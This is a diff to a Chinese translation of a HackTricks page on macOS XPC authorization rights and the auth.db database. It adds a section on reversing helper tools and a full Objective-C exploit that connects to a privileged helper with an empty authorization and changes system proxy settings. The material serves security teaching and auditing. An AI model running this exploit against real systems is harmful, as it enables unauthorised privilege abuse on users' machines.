@@ -72,7 +72,7 @@ if (self->_authRef) {
 [self.window makeKeyAndOrderFront:self];
 }
 ```
-`Common/Common.m`中的`setupAuthorizationRights`函数将应用程序的权限存储在`/var/db/auth.db`的授权数据库中。请注意，它只会添加尚未存在于数据库中的权限：
+`Common/Common.m` 中的 `setupAuthorizationRights` 函数将应用程序的权限存储在授权数据库 `/var/db/auth.db` 中。请注意，它只会添加尚未存在于数据库中的权限：
 ```objectivec
 + (void)setupAuthorizationRights:(AuthorizationRef)authRef
 // See comment in header.
@@ -104,7 +104,7 @@ assert(blockErr == errAuthorizationSuccess);
 }];
 }
 ```
-函数`enumerateRightsUsingBlock`用于获取应用程序的权限，这些权限在`commandInfo`中定义：
+函数`enumerateRightsUsingBlock`是用于获取应用程序权限的函数，这些权限在`commandInfo`中定义：
 ```objectivec
 static NSString * kCommandKeyAuthRightName    = @"authRightName";
 static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
@@ -182,15 +182,15 @@ block(authRightName, authRightDefault, authRightDesc);
 }];
 }
 ```
-这意味着在此过程结束时，`commandInfo`中声明的权限将存储在`/var/db/auth.db`中。请注意，您可以在其中找到**每个需要身份验证的方法**，**权限名称**和**`kCommandKeyAuthRightDefault`**。后者**指示谁可以获得此权限**。
+这意味着在此过程结束时，`commandInfo` 中声明的权限将存储在 `/var/db/auth.db` 中。请注意，您可以在其中找到**每个需要身份验证的方法**、**权限名称**和**`kCommandKeyAuthRightDefault`**。后者**指示谁可以获得此权限**。
 
-有不同的范围来指示谁可以访问权限。其中一些在[AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h)中定义（您可以在[此处找到所有内容](https://www.dssw.co.uk/reference/authorization-rights/)），但总结如下：
+有不同的范围来指示谁可以访问权限。其中一些在 [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) 中定义（您可以在[这里找到所有内容](https://www.dssw.co.uk/reference/authorization-rights/)），但总结如下：
 
 <table><thead><tr><th width="284.3333333333333">名称</th><th width="165">值</th><th>描述</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>任何人</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>无人</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>当前用户需要是管理员（在管理员组内）</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>要求用户进行身份验证。</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>要求用户进行身份验证。他需要是管理员（在管理员组内）</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>指定规则</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>在权限上指定一些额外的注释</td></tr></tbody></table>
 
 ### 权限验证
 
-在`HelperTool/HelperTool.m`中，函数**`readLicenseKeyAuthorization`**检查调用者是否被授权**执行此方法**，调用函数**`checkAuthorization`**。此函数将检查调用进程发送的**authData**是否具有**正确的格式**，然后将检查**获取权限所需的内容**以调用特定方法。如果一切顺利，**返回的`error`将为`nil`**：
+在 `HelperTool/HelperTool.m` 中，函数**`readLicenseKeyAuthorization`**检查调用者是否被授权**执行此方法**，调用函数**`checkAuthorization`**。此函数将检查调用进程发送的**authData**是否具有**正确的格式**，然后将检查**获取权限所需的条件**以调用特定方法。如果一切顺利，**返回的`error`将为`nil`**：
 ```objectivec
 - (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
 {
@@ -250,7 +250,7 @@ sudo sqlite3 /var/db/auth.db
 SELECT name FROM rules;
 SELECT name FROM rules WHERE name LIKE '%safari%';
 ```
-然后，您可以通过以下方式查看谁可以访问权限：
+然后，您可以使用以下命令查看谁可以访问权限：
 ```bash
 security authorizationdb read com.apple.safaridriver.allow
 ```
@@ -280,14 +280,158 @@ com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek,
 Rights with 'session-owner': 'true':
 authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
 ```
+## 反向授权
+
+### 检查是否使用EvenBetterAuthorization
+
+如果你找到了函数：**`[HelperTool checkAuthorization:command:]`**，那么该进程可能正在使用之前提到的授权模式：
+
+<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+如果这个函数调用了`AuthorizationCreateFromExternalForm`、`authorizationRightForCommand`、`AuthorizationCopyRights`、`AuhtorizationFree`等函数，那么它正在使用[**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154)。
+
+检查**`/var/db/auth.db`**以查看是否可以在没有用户交互的情况下获得调用某些特权操作的权限。
+
+### 协议通信
+
+然后，您需要找到协议模式，以便能够与XPC服务建立通信。
+
+函数**`shouldAcceptNewConnection`**指示正在导出的协议：
+
+<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+在这种情况下，我们与EvenBetterAuthorizationSample中的情况相同，[**查看此行**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)。
+
+知道所使用协议的名称后，可以使用以下命令**转储其头文件定义**：
+```
+class-dump /Library/PrivilegedHelperTools/com.example.HelperTool
+
+[...]
+@protocol HelperToolProtocol
+- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
+- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
+- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
+- (void)getVersionWithReply:(void (^)(NSString *))arg1;
+- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
+@end
+[...]
+```
+最后，我们只需要知道**暴露的 Mach 服务的名称**，以便与其建立通信。有几种方法可以找到它：
+
+* 在**`[HelperTool init]`**中，您可以看到正在使用的 Mach 服务：
+
+<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* 在 launchd plist 中：
+```
+cat /Library/LaunchDaemons/com.example.HelperTool.plist
+
+[...]
+
+<key>MachServices</key>
+<dict>
+<key>com.example.HelperTool</key>
+<true/>
+</dict>
+[...]
+```
+### 漏洞示例
+
+在这个示例中创建了以下内容：
+
+* 使用函数定义协议
+* 创建一个空的授权用于请求访问权限
+* 连接到XPC服务
+* 如果连接成功，则调用该函数
+```
+// gcc -framework Foundation -framework Security expl.m -o expl
+
+#import <Foundation/Foundation.h>
+#import <Security/Security.h>
+
+// Define a unique service name for the XPC helper
+static NSString* XPCServiceName = @"com.example.XPCHelper";
+
+// Define the protocol for the helper tool
+@protocol XPCHelperProtocol
+- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
+- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
+- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
+- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
+- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
+@end
+
+int main(void) {
+NSData *authData;
+OSStatus status;
+AuthorizationExternalForm authForm;
+AuthorizationRef authReference = {0};
+NSString *proxyAddress = @"127.0.0.1";
+NSString *proxyPort = @"4444";
+Boolean isProxyEnabled = true;
+
+// Create an empty authorization reference
+status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
+const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+
+// Convert the authorization reference to an external form
+if (status == errAuthorizationSuccess) {
+status = AuthorizationMakeExternalForm(authReference, &authForm);
+errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+}
+
+// Convert the external form to NSData for transmission
+if (status == errAuthorizationSuccess) {
+authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
+errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+}
+
+// Ensure the authorization was successful
+assert(status == errAuthorizationSuccess);
+
+// Establish an XPC connection
+NSString *serviceName = XPCServiceName;
+NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
+NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
+[xpcConnection setRemoteObjectInterface:xpcInterface];
+[xpcConnection resume];
+
+// Handle errors for the XPC connection
+id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
+NSLog(@"[-] Connection error");
+NSLog(@"[-] Error: %@", error);
+}];
+
+// Log the remote proxy and connection objects
+NSLog(@"Remote Proxy: %@", remoteProxy);
+NSLog(@"XPC Connection: %@", xpcConnection);
+
+// Use the legacy method to configure the proxy
+[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
+NSLog(@"Response: %@", error);
+}];
+
+// Allow some time for the operation to complete
+[NSThread sleepForTimeInterval:10.0f];
+
+NSLog(@"Finished!");
+}
+```
+## 参考资料
+
+* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)
+
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
